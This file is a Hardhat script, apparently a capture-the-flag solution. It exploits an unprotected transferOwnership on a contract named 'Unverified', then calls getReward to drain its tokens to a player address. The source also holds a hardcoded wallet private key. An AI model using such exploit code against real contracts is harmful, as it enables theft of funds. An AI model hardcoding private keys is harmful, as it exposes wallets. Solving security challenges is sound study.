import { ethers } from 'hardhat'
import { BigNumber } from 'ethers'
import { ETH_RPC } from '../secrets.config'

import * as dotenv from 'dotenv'
import { BNToNumstr } from '../gotbit-tools/hardhat/extensions/bignumber'
import { Token__factory, Unverified__factory } from '../typechain'
dotenv.config()


const instanceAddr = "0x597EaA3FdE7616Bd6a667096265d33Ac4363BdB3"
const playerAddr = "0x666B99107032D52A3cf05DCB660F1C981973be23"
const providerETH = new ethers.providers.JsonRpcProvider(ETH_RPC)

async function hack() {
  const signer = new ethers.Wallet("1d601a181721b4ee6e2c40ea05ff6b53e4efc35f584c39c5e004cc8a328c5c45", providerETH);
  const instanceContract = Unverified__factory.connect(instanceAddr, signer)

  const owner = await instanceContract.owner()
  const token = await instanceContract.token()

  console.log("owner:", owner);
  console.log("token", token);

  const tokenContract = Token__factory.connect(token, providerETH)
  console.log("contract balance:", await tokenContract.balanceOf(instanceAddr));
  console.log("user balance:", await tokenContract.balanceOf(playerAddr));
  
  await (await instanceContract.transferOwnership(playerAddr)).wait()
  console.log("owner:", await instanceContract.owner())

  await (await instanceContract.getReward(playerAddr)).wait()
  console.log("contract balance:", await tokenContract.balanceOf(instanceAddr));
  console.log("user balance:", await tokenContract.balanceOf(playerAddr));
}

hack()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error)
    process.exit(1)
  })